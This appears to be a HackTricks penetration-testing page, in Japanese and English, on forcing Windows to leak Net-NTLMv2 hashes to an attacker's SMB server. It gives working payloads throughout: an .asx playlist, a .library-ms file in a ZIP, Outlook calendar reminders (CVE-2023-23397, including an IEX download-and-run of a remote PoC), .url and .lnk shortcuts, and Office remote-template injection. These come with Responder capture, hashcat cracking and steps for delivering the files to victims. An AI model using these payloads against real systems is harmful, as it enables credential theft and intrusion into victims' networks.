# NTLM credsを盗む場所

{{#include ../../banners/hacktricks-training.md}}

**以下の素晴らしいアイデアをすべて確認してください: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — オンラインの microsoft word ファイルのダウンロードから ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md、そして [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player のプレイリスト (.ASX/.WAX)

あなたが操作する Windows Media Player のプレイリストをターゲットに開かせるかプレビューさせることができれば、エントリを UNC パスに向けることで Net‑NTLMv2 を leak できます。WMP は参照されたメディアを SMB 経由で取得しようとし、暗黙的に認証します。

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
収集とcrackingのフロー:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP 内に埋め込まれた .library-ms の NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIP アーカイブ内から直接開かれた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を単に参照・起動するだけで Explorer が UNC を列挙し、攻撃者へ NTLM 認証情報を送出します。これにより NetNTLMv2 が得られ、オフラインで解読したり、場合によってはリレーすることが可能です。

攻撃者の UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.

### Outlook カレンダーのリマインダー音パス (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows はカレンダー項目の extended MAPI property PidLidReminderFileParameter を処理していました。もしそのプロパティが UNC path（例: \\attacker\share\alert.wav）を指している場合、リマインダーが発火したときに Outlook は SMB share に接続し、ユーザーの Net‑NTLMv2 をクリック不要で leaking します。これは 2023年3月14日に修正されましたが、レガシー／未更新の環境や過去のインシデント対応においては依然として重要です。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 側:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
注意
- 被害者はリマインダーが表示されるときに Outlook for Windows を実行しているだけで十分です。
- この leak は Net‑NTLMv2 を生成し、offline cracking または relay に適している（not pass‑the‑hash）。

### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer はショートカットのアイコンを自動的にレンダリングします。最近の調査では、Microsoft の 2025年4月の UNC‑icon ショートカット向けのパッチ適用後でも、ショートカットのターゲットを UNC パス上にホストし、アイコンをローカルに保持することでクリック不要で NTLM 認証をトリガーできることが示されました（パッチバイパスは CVE‑2025‑50154 に割り当てられました）。フォルダを表示するだけで Explorer がリモートターゲットからメタデータを取得し、攻撃者の SMB サーバーに NTLM を送信します。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShellを使ったプログラムショートカットの payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ショートカットを ZIP に入れて被害者に参照させる。
- 被害者が開く書き込み可能な共有フォルダにショートカットを置く。
- 同じフォルダに他の誘導用ファイルを配置して Explorer が項目をプレビューするようにする。


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートを UNC パスに設定すると、ドキュメントを開いた際に SMB に対して認証が行われます。

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集し、rId1337 をあなたの UNC を指すように設定してください:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx に再パックして配布します。SMB capture listener を実行し、open を待ちます。

キャプチャ後の relaying や abusing NTLM に関するアイデアは、次を参照してください：

{{#ref}}
README.md
{{#endref}}


## 参考文献
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
